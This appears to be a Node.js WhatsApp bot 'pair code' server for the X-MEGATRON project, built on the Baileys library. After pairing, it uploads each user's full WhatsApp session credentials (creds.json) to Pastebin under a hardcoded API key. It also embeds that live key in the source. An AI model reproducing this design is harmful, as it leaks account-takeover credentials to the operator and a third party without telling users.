// pair.js — WhatsApp pair code with MEG4TRON fixed code
// Render-compatible: increased delays, retry logic for pair code

import express from 'express';
import fs from 'fs';
import pino from 'pino';
import {
  makeWASocket, useMultiFileAuthState, delay,
  makeCacheableSignalKeyStore, Browsers, jidNormalizedUser,
  fetchLatestBaileysVersion
} from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';
import fetch from 'node-fetch';
import { incrementPair } from './stats.js';

const router = express.Router();
const PASTEBIN_API_KEY = 'LKNSwf1j_nBPrwFXLr9OX7qvYoAmc8jB';
const PASTEBIN_API_URL = 'https://pastebin.com/api/api_post.php';

if (!global._sessionReady) global._sessionReady = {};

// Startup cleanup
['./temp_sessions', './temp_qr_sessions'].forEach(dir => {
  try {
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach(e => {
        try { fs.rmSync(`${dir}/${e}`, { recursive: true, force: true }); } catch (_) {}
      });
      console.log(`🧹 Cleaned temp dir: ${dir}`);
    }
  } catch (_) {}
});

async function uploadToPastebin(content, title) {
  try {
    const params = new URLSearchParams({
      api_dev_key: PASTEBIN_API_KEY, api_option: 'paste',
      api_paste_code: content, api_paste_name: title,
      api_paste_private: '1', api_paste_expire_date: 'N'
    });
    const r = await fetch(PASTEBIN_API_URL, {
      method: 'POST', body: params,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
    const result = await r.text();
    if (result.startsWith('https://pastebin.com/')) {
      return { success: true, id: result.split('/').pop().trim() };
    }
    return { success: false, error: result };
  } catch (e) { return { success: false, error: e.message }; }
}

function rm(p) {
  try { if (fs.existsSync(p)) fs.rmSync(p, { recursive: true, force: true }); }
  catch (_) {}
}

router.get('/', async (req, res) => {
  let num = (req.query.number || '').replace(/[^0-9]/g, '');
  const token = Date.now().toString() + Math.random().toString(36).substr(2, 9);
  const dir = `./temp_sessions/${token}`;

  fs.mkdirSync(dir, { recursive: true });

  const phone = pn('+' + num);
  if (!phone.isValid()) {
    rm(dir);
    return res.status(400).json({ code: 'Invalid phone number. Use full international format.' });
  }
  num = phone.getNumber('e164').replace('+', '');
  const displayPhone = '+' + num;

  async function run() {
    const { state, saveCreds } = await useMultiFileAuthState(dir);

    let sock;
    try {
      const { version } = await fetchLatestBaileysVersion();

      sock = makeWASocket({
        version,
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        // Use macOS Chrome browser fingerprint — more reliable on hosted environments
        browser: ['X-MEGATRON', 'Chrome', '120.0.0'],
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 25000,
        retryRequestDelayMs: 500,
        maxRetries: 8,
        syncFullHistory: false,
      });

      sock.ev.on('creds.update', saveCreds);

      sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
          console.log(`✅ Pair connected: ${displayPhone}`);
          try {
            const content = fs.readFileSync(dir + '/creds.json', 'utf8');
            const pb = await uploadToPastebin(content, `MEG4TRON - ${displayPhone}`);
            if (pb.success) {
              const sessionId = `xmegatron~${pb.id}`;
              const jid = jidNormalizedUser(num + '@s.whatsapp.net');
              await sock.sendMessage(jid, { text: sessionId });
              await sock.sendMessage(jid, {
                text: `✅ *X-MEGATRON Session Generated!*\n\nYour session ID has been sent above.\n\nSupport: https://t.me/xmegatronwha`
              });
              await incrementPair(displayPhone, sessionId);
              global._sessionReady[token] = { sessionId, ts: Date.now() };
              if (global.notifySessionSuccess) {
                try { await global.notifySessionSuccess(null, sessionId); } catch (_) {}
              }
            }
          } catch (err) { console.error('Open error:', err.message); }
          await delay(3000);
          rm(dir);
        }

        if (connection === 'close') {
          const code = lastDisconnect?.error?.output?.statusCode;
          if (code === 401) { rm(dir); }
          else if (code !== 428) { try { run(); } catch (_) {} }
        }
      });

      // Wait for socket to be ready before requesting pair code
      if (!sock.authState.creds.registered) {
        // Longer wait on hosted environments — critical fix for Render
        await delay(5000);

        let n = num;
        // Try requesting pair code up to 3 times (Render sometimes needs retry)
        let code = null;
        for (let attempt = 1; attempt <= 3; attempt++) {
          try {
            console.log(`🔑 Requesting MEG4TRON pair code for ${displayPhone} (attempt ${attempt})`);
            code = await sock.requestPairingCode(n, 'MEG4TRON');
            if (code) break;
          } catch (err) {
            console.error(`Pair code attempt ${attempt} failed:`, err.message);
            if (attempt < 3) await delay(3000);
          }
        }

        if (code) {
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          console.log(`🔑 Code for ${displayPhone}: ${code}`);
          if (!res.headersSent) res.json({ code, token });
        } else {
          if (!res.headersSent) res.status(503).json({ code: 'Could not generate pair code. Please try again.' });
          rm(dir);
        }
      }
    } catch (err) {
      console.error('Pair init error:', err.message);
      if (!res.headersSent) res.status(503).json({ code: 'Service error. Try again.' });
      rm(dir);
    }
  }

  await run();
});

router.get('/session-status', (req, res) => {
  const { token } = req.query;
  if (token && global._sessionReady[token]) {
    const { sessionId } = global._sessionReady[token];
    delete global._sessionReady[token];
    return res.json({ ready: true, sessionId });
  }
  res.json({ ready: false });
});

process.on('uncaughtException', (err) => {
  const s = String(err);
  const ok = ['conflict','not-authorized','Socket connection timeout','rate-overlimit','Connection Closed','Timed Out','Value not found','Stream Errored','515','503'];
  if (!ok.some(x => s.includes(x))) console.error('Uncaught:', err.message || err);
});

export default router;
